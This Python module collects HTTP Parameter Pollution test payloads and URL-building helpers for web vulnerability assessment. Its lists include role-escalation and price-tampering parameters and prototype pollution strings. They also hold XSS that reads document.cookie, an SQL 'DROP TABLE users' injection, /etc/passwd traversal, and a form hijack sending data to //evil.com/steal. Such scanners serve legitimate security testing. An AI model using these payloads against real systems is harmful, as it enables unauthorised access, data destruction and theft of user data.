"""
HTTP Parameter Pollution (HPP) Payloads for Generic Vulnerability Assessment

This module provides comprehensive HPP testing payloads for detecting
parameter pollution vulnerabilities across different web frameworks.

Categories:
1. Duplicate Parameter Testing
2. Array Parameter Injection
3. Prototype Pollution
4. Parameter Override Attacks
5. Server-Side HPP
6. Client-Side HPP

Reference: OWASP Testing Guide - HTTP Parameter Pollution
"""

from typing import List, Dict, Any, Tuple
from dataclasses import dataclass


# =============================================================================
# DUPLICATE PARAMETER PAYLOADS
# =============================================================================

# Test how servers handle duplicate parameters
# Different frameworks handle duplicates differently:
# - PHP: Takes last value
# - ASP.NET: Concatenates with comma
# - JSP/Servlet: Takes first value
# - Python (Flask): Takes first value
# - Python (Django): Takes last value
# - Node.js (Express): Returns array or last value
# - Ruby on Rails: Takes last value

DUPLICATE_PARAM_PAYLOADS: List[Dict[str, Any]] = [
    # Basic duplicate tests
    {"params": [("id", "1"), ("id", "2")], "description": "Basic duplicate - which value used?"},
    {"params": [("id", "1"), ("id", "999")], "description": "Duplicate with high ID"},
    {"params": [("id", "1"), ("id", "0")], "description": "Duplicate with zero ID"},
    {"params": [("id", "1"), ("id", "-1")], "description": "Duplicate with negative ID"},
    
    # Price/amount manipulation
    {"params": [("price", "100"), ("price", "1")], "description": "Price manipulation attempt"},
    {"params": [("price", "100"), ("price", "0")], "description": "Zero price injection"},
    {"params": [("amount", "1"), ("amount", "100")], "description": "Amount manipulation"},
    {"params": [("quantity", "1"), ("quantity", "999")], "description": "Quantity manipulation"},
    {"params": [("total", "500"), ("total", "1")], "description": "Total manipulation"},
    {"params": [("discount", "0"), ("discount", "100")], "description": "Discount manipulation"},
    
    # Access control bypass
    {"params": [("role", "user"), ("role", "admin")], "description": "Role escalation attempt"},
    {"params": [("admin", "false"), ("admin", "true")], "description": "Admin flag manipulation"},
    {"params": [("isAdmin", "0"), ("isAdmin", "1")], "description": "isAdmin manipulation"},
    {"params": [("access", "read"), ("access", "write")], "description": "Access level manipulation"},
    {"params": [("permission", "view"), ("permission", "delete")], "description": "Permission manipulation"},
    
    # User ID manipulation
    {"params": [("user_id", "1"), ("user_id", "2")], "description": "User ID HPP"},
    {"params": [("uid", "1"), ("uid", "admin")], "description": "UID manipulation"},
    {"params": [("account", "user"), ("account", "admin")], "description": "Account type HPP"},
    
    # Redirect manipulation
    {"params": [("redirect", "/home"), ("redirect", "//evil.com")], "description": "Open redirect HPP"},
    {"params": [("url", "/dashboard"), ("url", "javascript:alert(1)")], "description": "URL HPP with XSS"},
    {"params": [("next", "/profile"), ("next", "//attacker.com")], "description": "Next URL HPP"},
    {"params": [("return", "/"), ("return", "data:text/html,<script>alert(1)</script>")], "description": "Return URL HPP"},
    
    # Authentication bypass
    {"params": [("password", "wrong"), ("password", "")], "description": "Empty password HPP"},
    {"params": [("token", "invalid"), ("token", "null")], "description": "Token manipulation"},
    {"params": [("auth", "false"), ("auth", "true")], "description": "Auth flag HPP"},
    {"params": [("verified", "0"), ("verified", "1")], "description": "Verified status HPP"},
    
    # Action manipulation
    {"params": [("action", "view"), ("action", "delete")], "description": "Action manipulation"},
    {"params": [("cmd", "read"), ("cmd", "write")], "description": "Command manipulation"},
    {"params": [("op", "get"), ("op", "set")], "description": "Operation manipulation"},
    {"params": [("method", "GET"), ("method", "DELETE")], "description": "HTTP method override HPP"},
]


# =============================================================================
# ARRAY PARAMETER PAYLOADS
# =============================================================================

ARRAY_PARAM_PAYLOADS: List[Dict[str, Any]] = [
    # PHP-style array injection
    {"params": [("id[]", "1"), ("id[]", "2")], "description": "PHP array injection"},
    {"params": [("id[]", "1"), ("id[]", "admin")], "description": "Array with mixed types"},
    {"params": [("user[role]", "admin")], "description": "Nested array - role injection"},
    {"params": [("user[id]", "1"), ("user[id]", "2")], "description": "Nested array duplicate"},
    {"params": [("data[0]", "safe"), ("data[1]", "malicious")], "description": "Indexed array"},
    
    # Bracket notation attacks
    {"params": [("items[0][id]", "1"), ("items[0][price]", "0")], "description": "Deep nested array"},
    {"params": [("order[items][0][qty]", "1"), ("order[items][0][qty]", "999")], "description": "Nested quantity HPP"},
    {"params": [("filter[status]", "active"), ("filter[role]", "admin")], "description": "Filter injection"},
    
    # JSON-like parameters
    {"params": [("json", '{"id":1}'), ("json", '{"id":2,"admin":true}')], "description": "JSON parameter HPP"},
    {"params": [("data", '{"role":"user"}'), ("data", '{"role":"admin"}')], "description": "JSON role injection"},
    
    # Multiple array values
    {"params": [("ids[]", "1"), ("ids[]", "2"), ("ids[]", "3")], "description": "Multiple array values"},
    {"params": [("select[]", "name"), ("select[]", "password")], "description": "Field selection array"},
    {"params": [("columns[]", "id"), ("columns[]", "secret_key")], "description": "Column selection HPP"},
]


# =============================================================================
# PROTOTYPE POLLUTION PAYLOADS
# =============================================================================

PROTOTYPE_POLLUTION_PAYLOADS: List[str] = [
    # __proto__ pollution
    "__proto__[admin]=true",
    "__proto__[role]=admin",
    "__proto__[isAdmin]=1",
    "__proto__[constructor][prototype][admin]=true",
    "__proto__.admin=true",
    "__proto__.role=admin",
    "__proto__.isAuthenticated=true",
    "__proto__[polluted]=true",
    
    # Constructor pollution
    "constructor[prototype][admin]=true",
    "constructor[prototype][role]=admin",
    "constructor.prototype.admin=true",
    "constructor.prototype.isAdmin=1",
    
    # Prototype chain manipulation
    "prototype[admin]=true",
    "prototype.admin=true",
    "Object.prototype.admin=true",
    
    # Nested prototype pollution
    "a].__proto__[admin]=true",
    "a].__proto__.admin=true",
    "x[__proto__][admin]=true",
    "x.y.__proto__.admin=true",
    
    # JSON-based pollution
    '{"__proto__":{"admin":true}}',
    '{"constructor":{"prototype":{"admin":true}}}',
    '{"__proto__":{"role":"admin","isAdmin":true}}',
    
    # Array prototype pollution
    "arr[__proto__][admin]=true",
    "[__proto__][admin]=true",
    "items.__proto__.admin=true",
]


# =============================================================================
# PARAMETER OVERRIDE PAYLOADS
# =============================================================================

# Parameters commonly used for method/action override
OVERRIDE_PARAM_PAYLOADS: List[Dict[str, str]] = [
    # HTTP method override
    {"_method": "DELETE"},
    {"_method": "PUT"},
    {"_method": "PATCH"},
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-HTTP-Method": "PUT"},
    {"X-Method-Override": "DELETE"},
    
    # Action override
    {"_action": "delete"},
    {"_action": "admin"},
    {"action": "destroy"},
    {"cmd": "admin"},
    
    # Format override (for content-type manipulation)
    {"_format": "json"},
    {"format": "xml"},
    {"_type": "admin"},
    
    # Debug/test mode
    {"debug": "true"},
    {"test": "1"},
    {"_debug": "1"},
    {"dev": "true"},
    {"verbose": "true"},
    
    # Bypass flags
    {"_bypass": "true"},
    {"skip_auth": "1"},
    {"no_check": "true"},
    {"force": "true"},
    {"override": "true"},
]


# =============================================================================
# SERVER-SIDE HPP PAYLOADS
# =============================================================================

# Payloads for server-side parameter pollution
SERVER_SIDE_HPP: List[Dict[str, Any]] = [
    # Backend API manipulation
    {"params": [("api_key", "user_key"), ("api_key", "admin_key")], "target": "backend_api"},
    {"params": [("callback", "safe"), ("callback", "evil")], "target": "jsonp"},
    {"params": [("_callback", "cb"), ("_callback", "alert")], "target": "jsonp_alt"},
    
    # SQL query manipulation via HPP
    {"params": [("sort", "name"), ("sort", "password")], "target": "sql_column"},
    {"params": [("order", "ASC"), ("order", "ASC; DROP TABLE users--")], "target": "sql_order"},
    {"params": [("limit", "10"), ("limit", "999999")], "target": "sql_limit"},
    {"params": [("offset", "0"), ("offset", "-1")], "target": "sql_offset"},
    
    # Filter bypass
    {"params": [("filter", "active"), ("filter", "*")], "target": "filter"},
    {"params": [("status", "pending"), ("status", "all")], "target": "status_filter"},
    {"params": [("where", "id=1"), ("where", "1=1")], "target": "where_clause"},
    
    # Template injection via HPP
    {"params": [("template", "default"), ("template", "{{7*7}}")], "target": "template"},
    {"params": [("view", "home"), ("view", "../admin")], "target": "view_path"},
    {"params": [("partial", "header"), ("partial", "../../etc/passwd")], "target": "partial_lfi"},
]


# =============================================================================
# CLIENT-SIDE HPP PAYLOADS
# =============================================================================

# Payloads that exploit client-side parameter handling
CLIENT_SIDE_HPP: List[Dict[str, Any]] = [
    # DOM-based HPP
    {"params": [("redirect", "/safe"), ("redirect", "javascript:alert(document.domain)")], "type": "dom_xss"},
    {"params": [("url", "/page"), ("url", "data:text/html,<script>alert(1)</script>")], "type": "dom_xss"},
    
    # Form action manipulation
    {"params": [("form_action", "/submit"), ("form_action", "//evil.com/steal")], "type": "form_hijack"},
    {"params": [("target", "_self"), ("target", "_blank")], "type": "target_manipulation"},
    
    # Link injection
    {"params": [("href", "/page"), ("href", "javascript:alert(1)")], "type": "link_injection"},
    {"params": [("src", "/image.png"), ("src", "//evil.com/track.js")], "type": "src_injection"},
    
    # Event handler injection
    {"params": [("onclick", ""), ("onclick", "alert(1)")], "type": "event_injection"},
    {"params": [("onerror", ""), ("onerror", "alert(document.cookie)")], "type": "event_injection"},
]


# =============================================================================
# HPP-PRONE PARAMETER NAMES
# =============================================================================

HPP_PRONE_PARAMETERS: List[str] = [
    # Identity/Access
    "id", "user_id", "uid", "account_id", "profile_id",
    "role", "admin", "isAdmin", "is_admin", "permission",
    "access", "level", "group", "type", "status",
    
    # Financial
    "price", "amount", "total", "quantity", "qty",
    "discount", "tax", "fee", "cost", "value",
    
    # Actions
    "action", "cmd", "command", "op", "operation",
    "method", "_method", "do", "task", "mode",
    
    # URLs/Redirects
    "url", "redirect", "return", "next", "goto",
    "dest", "destination", "target", "link", "href",
    "callback", "continue", "forward", "ref",
    
    # Data
    "data", "json", "xml", "payload", "body",
    "input", "output", "result", "response",
    
    # Queries
    "q", "query", "search", "filter", "sort",
    "order", "limit", "offset", "page", "size",
    "select", "fields", "columns", "include",
    
    # Auth
    "token", "key", "api_key", "apikey", "secret",
    "password", "pass", "auth", "session", "cookie",
    
    # Files
    "file", "filename", "path", "filepath", "upload",
    "download", "attachment", "document",
    
    # Templates
    "template", "view", "partial", "layout", "theme",
    "skin", "style", "format", "render",
]


# =============================================================================
# HPP DETECTION PATTERNS
# =============================================================================

def get_hpp_detection_patterns() -> List[str]:
    """Get regex patterns for detecting HPP vulnerability indicators."""
    return [
        # Multiple values in response
        r"Array\s*\(",
        r"\[.*,.*\]",
        r"multiple\s+values",
        
        # Error messages indicating HPP
        r"duplicate\s+parameter",
        r"parameter\s+.*\s+specified\s+multiple",
        r"ambiguous\s+parameter",
        r"conflicting\s+values",
        
        # Framework-specific indicators
        r"Array\s+to\s+string\s+conversion",
        r"cannot\s+convert\s+array",
        r"expected\s+string.*got\s+array",
        
        # Successful manipulation indicators
        r"admin.*true",
        r"role.*admin",
        r"access.*granted",
        r"permission.*elevated",
        
        # Price/value change indicators
        r"total.*\$?0",
        r"price.*changed",
        r"amount.*modified",
    ]


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def build_hpp_query_string(params: List[Tuple[str, str]]) -> str:
    """
    Build a query string with potentially duplicate parameters.
    
    Args:
        params: List of (key, value) tuples
        
    Returns:
        Query string with all parameters
    """
    from urllib.parse import urlencode, quote
    
    # urlencode handles duplicates properly
    parts = []
    for key, value in params:
        parts.append(f"{quote(key)}={quote(str(value))}")
    
    return "&".join(parts)


def generate_hpp_test_urls(base_url: str, param_name: str) -> List[Dict[str, Any]]:
    """
    Generate HPP test URLs for a given parameter.
    
    Args:
        base_url: The base URL to test
        param_name: The parameter to test for HPP
        
    Returns:
        List of test cases with URLs and descriptions
    """
    test_cases = []
    
    # Basic duplicate tests
    test_values = [
        ("1", "2"),
        ("1", "999"),
        ("user", "admin"),
        ("false", "true"),
        ("0", "1"),
        ("safe", "malicious"),
    ]
    
    for val1, val2 in test_values:
        params = [(param_name, val1), (param_name, val2)]
        query = build_hpp_query_string(params)
        
        # Handle URL with existing query string
        separator = "&" if "?" in base_url else "?"
        test_url = f"{base_url}{separator}{query}"
        
        test_cases.append({
            "url": test_url,
            "params": params,
            "description": f"HPP test: {param_name}={val1}&{param_name}={val2}",
            "expected_behavior": "Check which value is used by the server"
        })
    
    # Array notation tests
    array_tests = [
        (f"{param_name}[]", "1", f"{param_name}[]", "2"),
        (f"{param_name}[0]", "1", f"{param_name}[1]", "admin"),
    ]
    
    for key1, val1, key2, val2 in array_tests:
        params = [(key1, val1), (key2, val2)]
        query = build_hpp_query_string(params)
        separator = "&" if "?" in base_url else "?"
        test_url = f"{base_url}{separator}{query}"
        
        test_cases.append({
            "url": test_url,
            "params": params,
            "description": f"Array HPP: {key1}={val1}&{key2}={val2}",
            "expected_behavior": "Check array handling"
        })
    
    return test_cases


def get_framework_behavior() -> Dict[str, str]:
    """
    Get expected HPP behavior for different frameworks.
    
    Returns:
        Dictionary mapping framework to behavior description
    """
    return {
        "PHP": "Takes LAST value (id=1&id=2 → id=2)",
        "ASP.NET": "Concatenates with comma (id=1&id=2 → id='1,2')",
        "JSP/Servlet": "Takes FIRST value (id=1&id=2 → id=1)",
        "Flask": "Takes FIRST value by default",
        "Django": "Takes LAST value",
        "Express.js": "Returns array or last value depending on parser",
        "Rails": "Takes LAST value",
        "Spring": "Takes FIRST value or returns array",
        "Gin (Go)": "Takes FIRST value",
        "FastAPI": "Can handle as list or single value",
    }


def get_hpp_payload_summary() -> Dict[str, int]:
    """Get summary of all HPP payloads."""
    return {
        "duplicate_params": len(DUPLICATE_PARAM_PAYLOADS),
        "array_params": len(ARRAY_PARAM_PAYLOADS),
        "prototype_pollution": len(PROTOTYPE_POLLUTION_PAYLOADS),
        "override_params": len(OVERRIDE_PARAM_PAYLOADS),
        "server_side_hpp": len(SERVER_SIDE_HPP),
        "client_side_hpp": len(CLIENT_SIDE_HPP),
        "hpp_prone_params": len(HPP_PRONE_PARAMETERS),
        "total_payloads": (
            len(DUPLICATE_PARAM_PAYLOADS) +
            len(ARRAY_PARAM_PAYLOADS) +
            len(PROTOTYPE_POLLUTION_PAYLOADS) +
            len(OVERRIDE_PARAM_PAYLOADS) +
            len(SERVER_SIDE_HPP) +
            len(CLIENT_SIDE_HPP)
        ),
    }


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Payload lists
    "DUPLICATE_PARAM_PAYLOADS",
    "ARRAY_PARAM_PAYLOADS", 
    "PROTOTYPE_POLLUTION_PAYLOADS",
    "OVERRIDE_PARAM_PAYLOADS",
    "SERVER_SIDE_HPP",
    "CLIENT_SIDE_HPP",
    "HPP_PRONE_PARAMETERS",
    
    # Functions
    "get_hpp_detection_patterns",
    "build_hpp_query_string",
    "generate_hpp_test_urls",
    "get_framework_behavior",
    "get_hpp_payload_summary",
]


if __name__ == "__main__":
    # Print summary
    summary = get_hpp_payload_summary()
    print("HPP Payload Summary:")
    for key, value in summary.items():
        print(f"  {key}: {value}")
    
    print(f"\nFramework behaviors:")
    for fw, behavior in get_framework_behavior().items():
        print(f"  {fw}: {behavior}")
